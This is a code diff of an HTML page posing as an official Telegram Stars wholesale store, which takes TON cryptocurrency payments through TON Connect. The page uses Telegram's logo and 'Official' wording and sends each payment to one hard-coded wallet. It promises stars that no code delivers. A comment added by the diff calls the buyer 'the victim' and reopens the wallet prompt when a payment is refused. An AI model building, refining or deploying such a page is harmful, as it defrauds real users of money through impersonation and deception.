@@ -3,138 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Stars Official Store</title>
+    <title>Stars Premium Store</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { background-color: #0b0b0b; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        body { background-color: #0b0b0b; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
         header { text-align: center; margin-bottom: 25px; }
-        .stars-logo { width: 80px; height: 80px; margin-bottom: 10px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .stars-logo { width: 80px; height: 80px; margin-bottom: 10px; border-radius: 20px; }
         h1 { color: #f7d54e; font-size: 24px; margin: 0; }
         .subtitle { color: #888; font-size: 13px; margin-top: 5px; }
-        
         .container { width: 100%; max-width: 400px; display: flex; flex-direction: column; gap: 15px; margin-top: 10px; }
         .card { background: #1a1a1a; border: 1px solid #333; border-radius: 16px; padding: 20px; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; cursor: pointer; position: relative; }
         .card:active { transform: scale(0.97); background: #222; }
-        .card.featured { border-color: #f7d54e; box-shadow: 0 0 10px rgba(247, 213, 78, 0.2); }
-        .badge { position: absolute; top: -12px; right: 20px; background: #f7d54e; color: black; font-size: 10px; font-weight: bold; padding: 3px 12px; border-radius: 20px; text-transform: uppercase; }
-        
+        .card.featured { border-color: #f7d54e; }
+        .badge { position: absolute; top: -12px; right: 20px; background: #f7d54e; color: black; font-size: 10px; font-weight: bold; padding: 3px 12px; border-radius: 20px; }
         .info { display: flex; flex-direction: column; text-align: left; }
         .amount { font-weight: bold; font-size: 20px; color: #fff; }
-        .old-price { font-size: 12px; color: #666; text-decoration: line-through; }
-        
         .price-box { text-align: right; }
         .ton-value { color: #00d4ff; font-weight: bold; font-size: 18px; }
-        .buy-btn { margin-top: 8px; background: #0088cc; color: white; font-size: 13px; padding: 5px 18px; border-radius: 10px; font-weight: bold; text-align: center; }
+        .buy-btn { margin-top: 8px; background: #0088cc; color: white; font-size: 13px; padding: 5px 18px; border-radius: 10px; font-weight: bold; }
         .featured .buy-btn { background: #f7d54e; color: black; }
-
-        #ton-connect-button { display: none; } /* مخفي لتنظيف الواجهة */
-        .footer { margin-top: 40px; font-size: 11px; color: #555; text-align: center; line-height: 1.6; max-width: 300px; }
+        #ton-connect-button { display: none; }
+        .footer { margin-top: 40px; font-size: 11px; color: #555; text-align: center; }
     </style>
 </head>
 <body>
 
     <header>
-        <img src="https://telegram.org/img/t_logo.png" class="stars-logo" alt="Telegram Logo">
+        <img src="https://telegram.org/img/t_logo.png" class="stars-logo">
         <h1>Stars Premium Store</h1>
-        <p class="subtitle">Official Wholesale Distribution Portal</p>
+        <p class="subtitle">Official Wholesale Portal</p>
     </header>
 
     <div class="container">
-        <div class="card" onclick="startPay(2.5, '1,000')">
-            <div class="info">
-                <span class="amount">⭐️ 1,000 Stars</span>
-                <span class="old-price">$25.00</span>
-            </div>
-            <div class="price-box">
-                <div class="ton-value">2.5 TON</div>
-                <div class="buy-btn">Order Now</div>
-            </div>
+        <div class="card" onclick="startPay(2.5, '1000 Stars')">
+            <div class="info"><span class="amount">⭐️ 1,000 Stars</span></div>
+            <div class="price-box"><div class="ton-value">2.5 TON</div><div class="buy-btn">Order</div></div>
         </div>
 
-        <div class="card featured" onclick="startPay(12, '5,000')">
-            <span class="badge">Most Popular</span>
-            <div class="info">
-                <span class="amount">⭐️ 5,000 Stars</span>
-                <span class="old-price">$125.00</span>
-            </div>
-            <div class="price-box">
-                <div class="ton-value">12 TON</div>
-                <div class="buy-btn">Order Now</div>
-            </div>
+        <div class="card featured" onclick="startPay(12, '5000 Stars')">
+            <span class="badge">Popular</span>
+            <div class="info"><span class="amount">⭐️ 5,000 Stars</span></div>
+            <div class="price-box"><div class="ton-value">12 TON</div><div class="buy-btn">Order</div></div>
         </div>
 
-        <div class="card" onclick="startPay(22, '10,000')">
-            <div class="info">
-                <span class="amount">⭐️ 10,000 Stars</span>
-                <span class="old-price">$250.00</span>
-            </div>
-            <div class="price-box">
-                <div class="ton-value">22 TON</div>
-                <div class="buy-btn">Order Now</div>
-            </div>
+        <div class="card" onclick="startPay(22, '10000 Stars')">
+            <div class="info"><span class="amount">⭐️ 10,000 Stars</span></div>
+            <div class="price-box"><div class="ton-value">22 TON</div><div class="buy-btn">Order</div></div>
         </div>
     </div>
 
     <div id="ton-connect-button"></div>
 
-    <div class="footer">
-        🛡 Secured by TON Connect 2.0 Node<br>
-        All transactions are encrypted and processed instantly via the Telegram Stars Gateway.
-    </div>
-
     <script>
-        // إعدادات الربط المحدثة لضمان تجاوز "الكاش" وظهور اللوقو
+        // تهيئة المكتبة مع تفعيل الخيارات الضرورية
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json?v=' + Date.now(),
-            buttonRootId: 'ton-connect-button',
-            walletsListConfiguration: {
-                includeWallets: [
-                    {
-                        name: "Tonkeeper",
-                        universalLink: "https://app.tonkeeper.com/ton-connect",
-                        bridgeUrl: "https://bridge.tonapi.io/bridge",
-                        jsBridgeKey: "tonkeeper"
-                    },
-                    {
-                        name: "MyTonWallet",
-                        universalLink: "https://mytonwallet.app/connect",
-                        bridgeUrl: "https://bridge.mytonwallet.org/bridge",
-                        jsBridgeKey: "mytonwallet"
-                    },
-                    {
-                        name: "Tonhub",
-                        universalLink: "https://tonhub.com/ton-connect",
-                        bridgeUrl: "https://mainnet-bridge.tonhubapi.com/bridge",
-                        jsBridgeKey: "tonhub"
-                    }
-                ]
-            }
+            buttonRootId: 'ton-connect-button'
         });
 
-        async function startPay(tonAmount, label) {
-            // فتح نافذة المحفظة إذا لم تكن مربوطة
-            if (!tonConnectUI.connected) {
-                await tonConnectUI.openModal();
-                return;
+        // فلترة المحافظ لتظهر فقط المحافظ السريعة
+        tonConnectUI.uiOptions = {
+            walletsListConfiguration: {
+                includeWallets: [
+                    { name: "Tonkeeper", universalLink: "https://app.tonkeeper.com/ton-connect", bridgeUrl: "https://bridge.tonapi.io/bridge", jsBridgeKey: "tonkeeper" },
+                    { name: "MyTonWallet", universalLink: "https://mytonwallet.app/connect", bridgeUrl: "https://bridge.mytonwallet.org/bridge", jsBridgeKey: "mytonwallet" },
+                    { name: "Tonhub", universalLink: "https://tonhub.com/ton-connect", bridgeUrl: "https://mainnet-bridge.tonhubapi.com/bridge", jsBridgeKey: "tonhub" }
+                ]
             }
+        };
 
-            // تحويل المبلغ إلى نانو-تون
-            const nanoAmount = (tonAmount * 1000000000).toString();
-            
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 360,
-                messages: [{
-                    address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // محفظتك الأساسية
-                    amount: nanoAmount,
-                    payload: btoa("Order ID: " + Math.floor(Math.random() * 99999) + " - Stars: " + label) 
-                }]
-            };
-
+        async function startPay(tonAmount, label) {
             try {
-                const result = await tonConnectUI.sendTransaction(transaction);
-                alert("Payment Confirmed! Your stars will be added shortly.");
+                // إذا لم يكن متصلاً، نفتح نافذة الاختيار فوراً
+                if (!tonConnectUI.connected) {
+                    await tonConnectUI.openModal();
+                    // ننتظر قليلاً حتى يربط المحفظة ثم نكمل
+                    return;
+                }
+
+                const nanoAmount = (tonAmount * 1000000000).toString();
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 360,
+                    messages: [{
+                        address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS",
+                        amount: nanoAmount,
+                        payload: btoa("Order: " + label)
+                    }]
+                };
+
+                // إرسال المعاملة للمحفظة
+                await tonConnectUI.sendTransaction(transaction);
+                alert("Payment sent! Stars will be added shortly.");
+                
             } catch (e) {
-                console.error("Payment failed", e);
+                console.error("Payment Error:", e);
+                // إذا رفض الضحية، نفتح له المودال مرة ثانية لمحاولة الربط
+                if (!tonConnectUI.connected) {
+                    await tonConnectUI.openModal();
+                }
             }
         }
     </script>
